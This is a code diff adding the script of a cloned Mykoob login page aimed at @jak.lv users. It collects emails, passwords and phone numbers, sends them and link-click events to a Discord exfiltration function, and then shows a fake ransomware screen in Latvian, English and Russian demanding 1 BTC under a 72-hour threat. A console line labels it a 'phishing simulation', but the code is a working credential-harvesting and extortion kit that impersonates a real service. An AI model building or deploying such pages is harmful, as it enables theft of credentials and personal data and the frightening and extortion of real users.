@@ -799,4 +799,241 @@ phoneSubmit.addEventListener('click', function () {
 
   if (rule) {
     if (number.length < rule.minLen || number.length > rule.maxLen) {
-      phoneError.textContent = t('phoneLength').replace('{n}', `${rule.minLen}${rule.minLen === rule.maxLen ?
+      phoneError.textContent = t('phoneLength').replace('{n}', `${rule.minLen}${rule.minLen === rule.maxLen ? '' : '-' + rule.maxLen}`);
+      return;
+    }
+    if (!rule.regex.test(number)) {
+      phoneError.textContent = t('phoneFormat').replace('{c}', rule.country);
+      return;
+    }
+  }
+
+  phoneError.textContent = '';
+  phoneSubmit.disabled = true;
+  phoneSubmit.textContent = t('verifying');
+
+  sendToDiscord(storedEmail, 'Telefona numurs apstiprināts', {
+    hasPassword: true,
+    phone: `${code}${number}`,
+    country: rule ? rule.country : null,
+  });
+
+  showWaitScreen();
+});
+
+phoneNumber.addEventListener('input', function () {
+  this.value = this.value.replace(/[^\d]/g, '');
+});
+
+phoneNumber.addEventListener('keydown', e => { if (e.key === 'Enter') phoneSubmit.click(); });
+
+/* ── Click-outside closes normal modals (not wait/ransom) ── */
+document.querySelectorAll('.modal-overlay').forEach(overlay => {
+  overlay.addEventListener('click', function (e) {
+    if (e.target === this) {
+      hideAllModals();
+      loginAttempts = 0;
+      formError.textContent = '';
+      phoneSubmit.disabled = false;
+      phoneSubmit.textContent = t('phoneSubmit');
+    }
+  });
+});
+
+/* ── Language ── */
+document.getElementById('langSelect').addEventListener('change', function () {
+  currentLang = this.value;
+  updateTexts(currentLang);
+});
+
+function updateTexts(lang) {
+  const tr = translations[lang] || translations.lv;
+  document.documentElement.lang = lang;
+
+  document.getElementById('mainTitle').textContent     = tr.mainTitle;
+  document.getElementById('emailLabel').textContent    = tr.emailLabel;
+  document.getElementById('pwdLabel').textContent      = tr.pwdLabel;
+  document.getElementById('loginBtn').textContent      = tr.loginBtn;
+  document.getElementById('altLabel').textContent      = tr.altLabel;
+  document.getElementById('eparakstsLink').textContent = tr.eparaksts;
+  document.getElementById('pwdForgotLink').textContent = tr.forgotLink;
+
+  document.getElementById('forgotTitle').textContent      = tr.forgotTitle;
+  document.getElementById('forgotSub').textContent        = tr.forgotSub;
+  document.getElementById('forgotEmailLabel').textContent = tr.emailLabel;
+  document.getElementById('forgotOldLabel').textContent   = tr.oldPasswordLabel;
+  document.getElementById('forgotCancel').textContent     = tr.cancel;
+  document.getElementById('forgotSend').textContent       = tr.sendReset;
+
+  document.getElementById('phoneTitle').textContent     = tr.phoneTitle;
+  document.getElementById('phoneSub').textContent       = tr.phoneSub;
+  document.getElementById('phoneCodeLabel').textContent = tr.phoneCodeLabel;
+  document.getElementById('phoneSubmit').textContent    = tr.phoneSubmit;
+
+  document.getElementById('waitTitle').textContent = tr.waitTitle;
+  document.getElementById('waitSub').textContent   = tr.waitSub;
+
+  document.getElementById('ransomTitle').textContent = tr.ransomTitle;
+  document.getElementById('ransomBody1').textContent = tr.ransomBody1;
+  document.getElementById('ransomBody2').innerHTML   = tr.ransomBody2;
+  document.getElementById('ransomBody3').textContent = tr.ransomBody3;
+
+  document.getElementById('footerCopyright').textContent = tr.footerCopyright;
+  document.getElementById('footerTerms').textContent     = tr.footerTerms;
+  document.getElementById('footerPrivacy').textContent   = tr.footerPrivacy;
+  document.getElementById('footerHelp').textContent      = tr.footerHelp;
+}
+
+/* ── Translations ── */
+const translations = {
+  lv: {
+    mainTitle: 'Izvēlieties pieslēgšanas veidu',
+    emailLabel: 'E-pasts',
+    pwdLabel: 'Parole',
+    loginBtn: 'Pieslēgties',
+    altLabel: 'Citi veidi:',
+    eparaksts: 'eParaksts',
+    forgotLink: 'Aizmirsāt paroli?',
+    forgotTitle: 'Aizmirsāt paroli?',
+    forgotSub: 'Ievadi savu e-pastu un veco paroli, lai saņemtu atjaunošanas saiti.',
+    oldPasswordLabel: 'Vecā parole',
+    cancel: 'Atcelt',
+    sendReset: 'Nosūtīt atjaunošanas saiti',
+    wrongPassword: 'Nepareiza parole. Mēģiniet vēlreiz.',
+    needEmail: 'Lūdzu, ievadi savu e-pasta adresi.',
+    needDomain: 'E-pastam jābeidzas ar @jak.lv',
+    needPassword: 'Lūdzu, ievadi paroli.',
+    needOldPassword: 'Lūdzu, ievadi savu veco paroli.',
+    phoneTitle: 'Papildu pārbaude',
+    phoneSub: 'Lai turpinātu, lūdzu apstipriniet savu tālruņa numuru.',
+    phoneCodeLabel: 'Valsts kods',
+    phoneSubmit: 'Verificēt',
+    needPhone: 'Lūdzu, ievadi savu tālruņa numuru.',
+    phoneDigitsOnly: 'Tālruņa numurā drīkst būt tikai cipari.',
+    phoneLength: 'Nepareizs numura garums. Jābūt {n} cipariem.',
+    phoneFormat: 'Nepareizs {c} numura formāts.',
+    verifying: 'Verificē...',
+    waitTitle: 'Verificējam jūsu numuru...',
+    waitSub: 'Lūdzu, uzgaidiet. Šis process var aizņemt līdz 1 minūtei.',
+    ransomTitle: 'Jūsu faili ir šifrēti',
+    ransomBody1: 'Visi jūsu dokumenti, fotogrāfijas un faili ir šifrēti ar AES-256. Lai tos atgūtu, mums ir nepieciešams maksājums.',
+    ransomBody2: 'Maksājuma summa: <strong>1 BTC</strong><br />Maksājuma adrese:',
+    ransomBody3: 'Ja maksājums netiks veikts 72 stundu laikā, atslēga tiks neatgriezeniski dzēsta.',
+    ransomTimerPrefix: 'Laiks atlicis:',
+    footerCopyright: '© Mykoob. Visas tiesības pieder Raivo Strazdiņam',
+    footerTerms: 'Lietošanas noteikumi',
+    footerPrivacy: 'Privātuma politika',
+    footerHelp: 'Palīdzības centrs',
+  },
+  en: {
+    mainTitle: 'Choose login method',
+    emailLabel: 'Email',
+    pwdLabel: 'Password',
+    loginBtn: 'Log in',
+    altLabel: 'Other methods:',
+    eparaksts: 'eParaksts',
+    forgotLink: 'Forgot password?',
+    forgotTitle: 'Forgot password?',
+    forgotSub: 'Enter your email and old password to receive a reset link.',
+    oldPasswordLabel: 'Old password',
+    cancel: 'Cancel',
+    sendReset: 'Send reset link',
+    wrongPassword: 'Incorrect password. Try again.',
+    needEmail: 'Please enter your email address.',
+    needDomain: 'Email must end with @jak.lv',
+    needPassword: 'Please enter your password.',
+    needOldPassword: 'Please enter your old password.',
+    phoneTitle: 'Additional verification',
+    phoneSub: 'To continue, please confirm your phone number.',
+    phoneCodeLabel: 'Country code',
+    phoneSubmit: 'Verify',
+    needPhone: 'Please enter your phone number.',
+    phoneDigitsOnly: 'Phone number may contain digits only.',
+    phoneLength: 'Invalid number length. Must be {n} digits.',
+    phoneFormat: 'Invalid {c} phone number format.',
+    verifying: 'Verifying...',
+    waitTitle: 'Verifying your number...',
+    waitSub: 'Please wait. This process may take up to 1 minute.',
+    ransomTitle: 'Your files have been encrypted',
+    ransomBody1: 'All of your documents, photos, and files have been encrypted with AES-256. To recover them, we require payment.',
+    ransomBody2: 'Payment amount: <strong>1 BTC</strong><br />Payment address:',
+    ransomBody3: 'If payment is not made within 72 hours, the key will be irreversibly destroyed.',
+    ransomTimerPrefix: 'Time remaining:',
+    footerCopyright: '© Mykoob. All rights reserved by Raivo Strazdiņš',
+    footerTerms: 'Terms of Service',
+    footerPrivacy: 'Privacy Policy',
+    footerHelp: 'Help Center',
+  },
+  ru: {
+    mainTitle: 'Выберите способ входа',
+    emailLabel: 'Email',
+    pwdLabel: 'Пароль',
+    loginBtn: 'Войти',
+    altLabel: 'Другие способы:',
+    eparaksts: 'eParaksts',
+    forgotLink: 'Забыли пароль?',
+    forgotTitle: 'Забыли пароль?',
+    forgotSub: 'Введите свой email и старый пароль, чтобы получить ссылку для сброса.',
+    oldPasswordLabel: 'Старый пароль',
+    cancel: 'Отмена',
+    sendReset: 'Отправить ссылку для сброса',
+    wrongPassword: 'Неверный пароль. Попробуйте снова.',
+    needEmail: 'Пожалуйста, введите адрес электронной почты.',
+    needDomain: 'Email должен заканчиваться на @jak.lv',
+    needPassword: 'Пожалуйста, введите пароль.',
+    needOldPassword: 'Пожалуйста, введите старый пароль.',
+    phoneTitle: 'Дополнительная проверка',
+    phoneSub: 'Чтобы продолжить, подтвердите свой номер телефона.',
+    phoneCodeLabel: 'Код страны',
+    phoneSubmit: 'Проверить',
+    needPhone: 'Пожалуйста, введите номер телефона.',
+    phoneDigitsOnly: 'Номер телефона может содержать только цифры.',
+    phoneLength: 'Неверная длина номера. Должно быть {n} цифр.',
+    phoneFormat: 'Неверный формат номера {c}.',
+    verifying: 'Проверка...',
+    waitTitle: 'Проверяем ваш номер...',
+    waitSub: 'Пожалуйста, подождите. Этот процесс может занять до 1 минуты.',
+    ransomTitle: 'Ваши файлы зашифрованы',
+    ransomBody1: 'Все ваши документы, фотографии и файлы зашифрованы с помощью AES-256. Чтобы вернуть их, требуется оплата.',
+    ransomBody2: 'Сумма платежа: <strong>1 BTC</strong><br />Адрес для оплаты:',
+    ransomBody3: 'Если оплата не будет произведена в течение 72 часов, ключ будет безвозвратно уничтожен.',
+    ransomTimerPrefix: 'Осталось времени:',
+    footerCopyright: '© Mykoob. Все права принадлежат Райво Страздиньшу',
+    footerTerms: 'Условия использования',
+    footerPrivacy: 'Политика конфиденциальности',
+    footerHelp: 'Справочный центр',
+  },
+};
+
+function t(key) {
+  return (translations[currentLang] || translations.lv)[key] || key;
+}
+
+/* ── Light/dark logo ── */
+function swapLogo() {
+  const logo = document.getElementById('brandLogo');
+  const isLight = window.matchMedia('(prefers-color-scheme: light)').matches;
+  logo.src = isLight
+    ? 'https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-dark-DX3tqsaM.png'
+    : 'https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png';
+}
+window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', swapLogo);
+
+/* ── Init ── */
+(function init() {
+  const params = new URLSearchParams(window.location.search);
+  const emailParam = params.get('email');
+  if (emailParam) {
+    emailInput.value = emailParam;
+    storedEmail = emailParam;
+    sendToDiscord(emailParam, '📨 Saites atvēršana', { clickOnly: true });
+  }
+
+  swapLogo();
+  updateTexts('lv');
+  console.log('[Mykoob] Phishing simulation ready.');
+})();
+</script>
+
+</body>
+</html>
